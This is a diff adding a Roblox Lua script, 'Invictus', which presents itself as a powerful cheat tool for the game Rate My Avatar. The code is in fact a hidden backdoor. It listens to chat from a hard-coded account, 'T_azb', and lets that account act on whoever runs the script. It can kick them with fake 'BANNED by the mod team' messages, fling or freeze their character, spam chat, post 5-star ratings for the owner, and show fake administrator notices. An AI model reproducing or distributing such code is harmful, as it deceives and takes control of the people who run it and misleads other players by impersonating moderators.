@@ -1,0 +1,335 @@
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("best rma script has been executed?!?! | Invictus - Most powerful RMA script.","All")
+
+local _P = game:GetService("Players")
+local players = game:GetService("Players")
+local Players = game:GetService("Players")
+local LP = _P.LocalPlayer
+PlaceId, JobId = game.PlaceId, game.JobId
+local jobId = 'https://www.roblox.com/games/6708206173/Rate-My-Avatar?serverJobId='..JobId..''
+local targetPlayer = Players:FindFirstChild("T_azb")
+local player = game.Players.LocalPlayer
+local charX = player.character
+local A = charX:WaitForChild("Humanoid")
+local p = game:GetService("Players")
+local lp = game:FindService("Players").LocalPlayer
+local player = game.Players.LocalPlayer
+local BootTime = os.time()
+local whitelisted = {
+    ["T_azb"] = true,
+    ["Getyourprize550"] = true,
+    ["AlMBOTERXX"] = true,
+    ["Getyourprize549"] = true,
+    ["AlMBOTERXX6"] = true,
+    ["Cheatgirl68"] = true,
+    ["RyosUser"] = true
+}
+
+local function isWhitelisted(player)
+    return whitelisted[player.Name] ~= nil
+end
+
+local LocalPlayer = game.Players.LocalPlayer;
+local PlayerGui = LocalPlayer.PlayerGui or LocalPlayer:WaitForChild("PlayerGui");
+local MainGui = PlayerGui:FindFirstChild("MainGui");
+local notification = MainGui:WaitForChild("NotificationFrame");
+local notificationSound = MainGui["Main Gui Core"].NotificationSound;
+function spawngreeting(p1, p2)
+    local notification = notification:Clone();
+    notification.Parent = MainGui;
+    notification.NotificationText.Text = p1;
+    notification.Visible = true;
+    notificationSound:Play();
+    if p2 then
+        task.wait(p2);
+    else
+        task.wait(5);
+    end;
+    notification.Visible = false;
+    notification:Destroy();
+end;
+spawngreeting("Please wait 30 seconds for the script to load.");
+
+local function gplr(String)
+	local Found = {}
+	local strl = String:lower()
+	if strl == "all" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			table.insert(Found,v)
+		end
+	elseif strl == "others" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name ~= lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	elseif strl == "me" then
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name == lp.Name then
+				table.insert(Found,v)
+			end
+		end 
+	else
+		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+			if v.Name:lower():sub(1, #String) == String:lower() then
+				table.insert(Found,v)
+			end
+		end 
+	end
+	return Found 
+end
+
+local function trim(s)
+    return s:gsub("^%s+", ""):gsub("%s+$", "")
+end
+
+local customEmojis = {
+	["943250292"] = "👑 Founder",
+	["4785601821"] = "👑 Co-Founder",
+    ["1243520107"] = "🔥 Partner",
+    ["4788621911"] = "💩 Poopy head",
+    ["81622917"] = "💀 No-Life"
+}
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if customEmojis[tostring(plr.UserId)] then
+		plr.CharacterAdded:Wait()
+		local char = plr.Character
+		local humanoid = char:WaitForChild("Humanoid")
+		local emoji = customEmojis[tostring(plr.UserId)]
+		humanoid.DisplayName = "["..emoji.."] "..humanoid.DisplayName
+		plr.CharacterAdded:Connect(function(char)
+			local humanoid = char:WaitForChild("Humanoid")
+			humanoid.DisplayName = "["..emoji.."] "..humanoid.DisplayName
+		end)
+	end
+end)
+
+function banPlayer()
+    if targetPlayer then
+        LP:Kick("You have been BANNED by the mod team!")
+    end
+end
+
+function kickPlayer()
+    if targetPlayer then
+        LP:Kick("You have been KICKED by the mod team!")
+    end
+end
+
+function spinPlayer()
+    if targetPlayer then
+        power = 150 -- change this to make it more or less powerful
+ 
+        game:GetService('RunService').Stepped:connect(function()
+        game.Players.LocalPlayer.Character.Head.CanCollide = false
+        game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+        game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+    end)
+        wait(.1)
+        local bambam = Instance.new("BodyThrust")
+        bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+        bambam.Force = Vector3.new(power,0,power)
+        bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    end
+end
+
+function flingPlayer()
+    if targetPlayer then
+        local Target = gplr(game.Players.LocalPlayer.Name)
+	if Target[1] then
+		Target = Target[1]
+ 
+		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+		Thrust.Force = Vector3.new(99999,99999,99999)
+		Thrust.Name = "YeetForce"
+		repeat
+			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+			Thrust.Location = Target.Character.HumanoidRootPart.Position
+			game:FindService("RunService").Heartbeat:wait()
+		until not Target.Character:FindFirstChild("Head")
+	else
+		print("Invalid player")
+	end
+    end
+end
+
+function dancePlayer()
+    if targetPlayer then
+        game:GetService("Players"):Chat("/e dance")
+    end
+end
+
+function dance1Player()
+    if targetPlayer then
+        game:GetService("Players"):Chat("/e dance1")
+    end
+end
+
+function dance2Player()
+    if targetPlayer then
+        game:GetService("Players"):Chat("/e dance2")
+    end
+end
+
+function dance3Player()
+    if targetPlayer then
+        game:GetService("Players"):Chat("/e dance3")
+    end
+end
+
+function thawPlayer()
+    if targetPlayer then
+        game.Players.LocalPlayer.Character.Head.Anchored = false
+    end
+end
+
+function freezePlayer()
+    if targetPlayer then
+        game.Players.LocalPlayer.Character.Head.Anchored = true
+    end
+end
+
+function resetPlayer()
+    if targetPlayer then
+        A.Health = 0
+        task.wait(6.5)
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+    end
+end
+
+function CreditsInvictus()
+    if targetPlayer then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This user is using Invictus, One of the most powerful RMA scripts!","All")
+    end
+end
+
+function RuleInvictus()
+    if targetPlayer then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players!","All")
+    end
+end
+
+function RateOwner5()
+    if targetPlayer then
+
+        local args = {
+            [1] = game:GetService("Players").T_azb,
+            [2] = 5
+        }
+        
+        game:GetService("ReplicatedStorage").PostRating:FireServer(unpack(args))
+
+    end
+end
+
+function rblxwarnCMD()
+    if targetPlayer then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+        task.wait(.1)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invictus will run all RMA players! | RLBXWARN CMD","All")
+    end
+end
+
+function bringPlayers()
+    if targetPlayer then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm here Invictus Masters!", "All")
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        task.wait(0.15)
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        game.Players.LocalPlayer.Character.Head.Anchored = true
+        LP.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        task.wait(15)
+        game.Players.LocalPlayer.Character.Head.Anchored = false
+    end
+end
+
+function blacklistKick()
+    if targetPlayer then
+        LP:Kick("You have been blacklisted from Invictus, Reason: Skid")
+    end
+end
+
+function rejoinPlayer()
+    if targetPlayer then
+        game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+    end
+end
+
+function ModNotification()
+    if targetPlayer then
+        local LocalPlayer = game.Players.LocalPlayer;
+        local PlayerGui = LocalPlayer.PlayerGui or LocalPlayer:WaitForChild("PlayerGui");
+        local MainGui = PlayerGui:FindFirstChild("MainGui");
+        local notification = MainGui:WaitForChild("NotificationFrame");
+        local notificationSound = MainGui["Main Gui Core"].NotificationSound;
+        function spawnmodnoti(p1, p2)
+            local notification = notification:Clone();
+            notification.Parent = MainGui;
+            notification.NotificationText.Text = p1;
+            notification.Visible = true;
+            notificationSound:Play();
+            if p2 then
+                task.wait(p2);
+            else
+                task.wait(5);
+            end;
+            notification.Visible = false;
+            notification:Destroy();
+        end;
+        spawnmodnoti("An Administator has joined the game!");
+    end
+end
+
+local commands = {
+    ["ban"] = banPlayer,
+    ["kick"] = kickPlayer,
+    ["spin"] = spinPlayer,
+    ["fling"] = flingPlayer,
+    ["dance"] = dancePlayer,
+    ["dance1"] = dance1Player,
+    ["dance2"] = dance2Player,
+    ["dance3"] = dance3Player,
+    ["thaw"] = thawPlayer,
+    ["freeze"] = freezePlayer,
+    ["reset"] = resetPlayer,
+    ["credits"] = CreditsInvictus,
+    ["rule"] = RuleInvictus,
+    ["rate"] = RateOwner5,
+    ["warncmd"] = rblxwarnCMD,
+    ["bring"] = bringPlayers,
+    ["blacklistKick"] = blacklistKick,
+    ["rejoin"] = rejoinPlayer,
+    ["mod"] = ModNotification,
+}
+
+
+targetPlayer.Chatted:Connect(function(msg)
+    local command = commands[msg:lower()]
+    if command then
+        command()
+    end
+end)
